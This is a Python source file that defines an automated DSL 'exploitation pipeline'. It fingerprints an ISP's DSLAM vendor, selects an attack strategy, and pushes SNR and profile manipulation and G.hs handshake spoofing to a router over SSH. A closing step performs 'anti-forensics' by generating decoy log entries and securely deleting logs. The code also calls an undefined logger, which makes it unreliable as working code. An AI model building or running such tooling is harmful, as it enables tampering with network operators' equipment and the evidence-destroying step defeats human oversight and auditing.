import logging
from unittest.mock import MagicMock

from src.dslam_detector import UniversalDSLAMDetector
from src.reporting import ReportGenerator
from src.database_manager import DatabaseManager
from src.log_manager import LogManager
from src.vulnerability_scanner import VulnerabilityScanner
from src.advanced_dsl_physics import AdvancedDSLPhysics
from src.spoofing import KernelDSLManipulator, GHSHandshakeSpoofer
from src.keenetic_dsl_interface import KeeneticDSLInterface
from src.exploitation_strategy_engine import ExploitationStrategyEngine

class ExploitPipeline:
    """
    Orchestrates the end-to-end automated DSL exploitation process, from
    detection and scanning to exploit execution and validation.
    """

    def __init__(self, target_ip: str, community_string: str, signature_file: str, target_rate_mbps: float = 125.0, loop_length: int = None, signal_boost: int = None, pilot_power: int = None, stealth_mode: bool = False, secure_logging: bool = False):
        self.target_ip = target_ip
        self.community_string = community_string
        self.target_rate_mbps = target_rate_mbps
        self.loop_length = loop_length
        self.signal_boost = signal_boost
        self.pilot_power = pilot_power
        self.stealth_mode = stealth_mode
        self.ssh_interface = None  # Must be set before running
        self.final_report = {}

        self.log_manager = LogManager(secure_logging_enabled=secure_logging)
        self.log_manager.log("pipeline_init", {"stealth_mode": self.stealth_mode})

        self.db_manager = DatabaseManager(self.log_manager, signature_file_path=signature_file)
        self.detector = UniversalDSLAMDetector(
            target_ip=self.target_ip,
            community_string=self.community_string,
            db_manager=self.db_manager,
            ssh_interface=self.ssh_interface
        )
        self.scanner = VulnerabilityScanner(self.db_manager)
        self.physics = AdvancedDSLPhysics(profile='17a') # Default profile
        self.strategy_engine = None # Will be initialized after detection
        self.log_manager.log("pipeline_components_initialized", {})

    def _execute_strategy(self, strategy_plan: dict) -> dict:
        """Executes a strategy plan from the ExploitationStrategyEngine using a dispatcher."""
        plan_name = strategy_plan.get('name', 'Unnamed Plan')
        plan_type = strategy_plan.get('type', 'unknown')
        self.logger.info(f"Executing strategy: '{plan_name}' of type '{plan_type}'")
        results = {"strategy_name": plan_name, "steps": []}

        try:
            # Initialize all manipulators that might be needed
            manipulator = KernelDSLManipulator(self.ssh_interface, profile='17a')
            ghs_spoofer = GHSHandshakeSpoofer(self.ssh_interface)
            # In the future, an SNMP manipulator would be initialized here
            # snmp_manipulator = SNMPManipulator(...)

            if plan_type == 'multi_vector':
                # A flexible dispatcher for different actions within a multi-step plan
                action_dispatcher = {
                    'ghs_handshake_spoof': lambda p: ghs_spoofer.inject_capability_bits(**p),
                    'kernel_manipulation': lambda p: manipulator.set_target_profile(**p),
                }

                for i, step in enumerate(strategy_plan.get('steps', [])):
                    action = step.get('action')
                    params = step.get('params', {})
                    self.logger.info(f"Executing step {i+1}/{len(strategy_plan['steps'])}: {action} with params {params}")

                    if action in action_dispatcher:
                        step_result = action_dispatcher[action](params)
                    else:
                        self.logger.error(f"Unknown action in multi-vector plan: {action}")
                        step_result = {"error": f"Unknown action: {action}"}
                    results['steps'].append(step_result)

            elif plan_type == 'kernel_manipulation':
                # This handles the simpler, single-strategy kernel plans
                params = strategy_plan.get('params', {})
                strategy = params.get('strategy', 'static')

                kernel_strategy_dispatcher = {
                    'static': lambda: manipulator.set_target_profile(
                        target_rate_mbps=params.get('target_rate_mbps'), target_distance_m=50),
                    'dynamic_reduce': lambda: manipulator.dynamically_reduce_snr(
                        target_snr_floor_db=params.get('target_snr_floor_db')),
                    'adaptive': lambda: manipulator.adapt_to_line_quality(monitoring_duration_s=300),
                }

                if strategy in kernel_strategy_dispatcher:
                    strategy_results = kernel_strategy_dispatcher[strategy]()
                else:
                    strategy_results = {"error": f"Unknown kernel strategy: {strategy}"}
                results['steps'].append(strategy_results)

            elif plan_type == 'snmp_manipulation':
                self.logger.warning(f"Plan type '{plan_type}' is not yet implemented. This is a placeholder.")
                # Future implementation would use a real SNMP manipulator.
                # For now, we just log that it's a recognized but unimplemented type.
                step_result = {"status": "not_implemented", "details": "SNMP manipulation handler is a placeholder."}
                results['steps'].append(step_result)

            else:
                self.logger.error(f"Unsupported plan type: '{plan_type}'")
                return {"error": f"Unsupported plan type: {plan_type}"}

            return results
        except NotImplementedError as e:
            self.logger.error(f"A requested manipulation is not supported by the device's HAL: {e}")
            return {"error": "NotImplementedError", "details": str(e)}
        except Exception as e:
            self.logger.error(f"Strategy execution failed: {e}", exc_info=True)
            return {"error": str(e)}

    def _validate_outcome(self, execution_result: dict) -> bool:
        """Validates if the exploit strategy was successful."""
        print("--- Validating Outcome ---")
        if not execution_result or execution_result.get("error"):
            self.logger.error(f"Validation Failed: Strategy execution failed with error: {execution_result.get('error')}")
            return False

        # For multi-vector plans, check for errors in each step
        if 'steps' in execution_result:
            for i, step_result in enumerate(execution_result['steps']):
                if step_result.get("error"):
                    self.logger.error(f"Validation Failed: Step {i+1} of strategy '{execution_result.get('strategy_name')}' failed: {step_result.get('error')}")
                    return False

        # If no errors were found, the strategy is considered successful.
        # A more advanced validation could check for specific metric changes.
        self.logger.info(f"‚úÖ Validation Successful for strategy: {execution_result.get('strategy_name')}")
        return True

    def _configure_mocks(self):
        """Sets up all necessary mocks for a demonstration run."""
        print("[INFO] Configuring mocks for demonstration run...")

        # Mock the SNMP manager inside the detector to avoid real network calls
        self.detector.snmp_manager.get = MagicMock(return_value="1.3.6.1.4.1.2011") # Huawei sysObjectID

        # Mock non-SNMP analyzers
        ghs_analysis_mock = {"vendor_id": "HWTC", "vsi": b"MA5608T", "handshake_duration": 200}
        self.detector.ghs_analyzer.analyze_capture = MagicMock(return_value=ghs_analysis_mock)
        self.detector.dns_analyzer.get_hostname_by_ip = MagicMock(return_value="dslam-ma5608t.isp.com")
        self.detector.dhcp_analyzer.capture_and_analyze = MagicMock(return_value=None)
        self.detector.tr069_analyzer.capture_and_analyze = MagicMock(return_value=None)

        # If there's still an SSH interface, mock its command execution
        if self.ssh_interface and isinstance(self.ssh_interface, MagicMock):
            def mock_ssh_executor(command, timeout=None):
                logging.info(f"Mock SSH executing: '{command}'")
                if "cat /proc/device-tree/model" in command:
                    return "Keenetic Giga (KN-1010)", ""
                if "command -v xdslctl" in command:
                    return "/usr/bin/xdslctl", ""
                if "xdslctl configure --snr" in command:
                    return "", ""
                return "", ""
            self.ssh_interface.execute_command.side_effect = mock_ssh_executor

    def run(self):
        """Executes the full exploitation pipeline."""
        print("üöÄ Starting Automated Exploitation Pipeline üöÄ")

        # The detector's SSH interface is now set during its initialization
        self.detector.ssh = self.ssh_interface
        self._configure_mocks()

        # Step 1: Automated DSLAM Detection
        print(f"\n[Step 1] Running multi-method vendor identification for target: {self.target_ip}...")
        # We can now directly call the SNMP method without SSH
        detection_result = self.detector.identify_vendor(methods=['g_hs', 'snmp', 'dns', 'timing'])
        if not detection_result or 'primary_vendor' not in detection_result:
            print("‚ùå DSLAM detection failed. Aborting pipeline.")
            return
        vendor = detection_result['primary_vendor']
        print(f"‚úÖ DSLAM Detected: {vendor} with confidence {detection_result['overall_confidence']}%")
        self.final_report['detection'] = detection_result

        # Step 2: Initialize Strategy Engine
        print("\n[Step 2] Initializing Exploitation Strategy Engine...")
        self.strategy_engine = ExploitationStrategyEngine(self.db_manager, detection_result)
        print("‚úÖ Strategy Engine Initialized.")

        # Step 3: Select Exploitation Strategy
        print("\n[Step 3] Selecting optimal exploitation strategy...")
        # In a real scenario, we'd gather live line characteristics here.
        # For now, we'll use placeholder data.
        line_characteristics = {"snr_margin": 12.5, "attenuation": 18.0}
        strategy_plan = self.strategy_engine.select_strategy(line_characteristics, self.stealth_mode)
        if not strategy_plan:
            print("‚ùå Could not determine a suitable exploitation strategy. Aborting.")
            return
        print(f"‚úÖ Strategy Selected: {strategy_plan['name']}")
        self.final_report['strategy'] = strategy_plan

        # Step 4: Exploit Execution
        print("\n[Step 4] Executing selected strategy...")
        execution_result = self._execute_strategy(strategy_plan)
        self.final_report['execution'] = execution_result

        # Step 5: Validation and Logging
        print("\n[Step 5] Validating exploit outcome...")
        is_successful = self._validate_outcome(execution_result)
        self.final_report['validation'] = {"success": is_successful}

        # Log the attempt for future learning
        self.db_manager.log_exploitation_attempt(
            dslam_info=detection_result,
            strategy_name=strategy_plan.get('name', 'Unknown Strategy'),
            success=is_successful
        )

        if not is_successful:
            print("[INFO] Rollback would be triggered here in a real scenario.")

        # Step 6: Reporting
        print("\n[Step 6] Generating final report...")
        self.report_generator = ReportGenerator(self.final_report, self.log_manager)
        print("\n" + "="*20 + " FINAL TEXT REPORT " + "="*20)
        print(self.report_generator.generate_text_report())
        print("\n" + "="*20 + " FINAL JSON REPORT " + "="*20)
        print(self.report_generator.generate_json_report())

        print("\nüéâ Automated Exploitation Pipeline Complete üéâ")

        # Step 7: Anti-Forensics Log Cleanup
        if self.log_manager.secure_logging_enabled:
            print("\n[Step 7] Performing anti-forensics log cleanup...")
            secure_logger = self.log_manager.get_secure_logger()
            if secure_logger:
                secure_logger.generate_decoy_log_entries()
                secure_logger.secure_delete_log()
                print("‚úÖ Secure log cleanup complete.")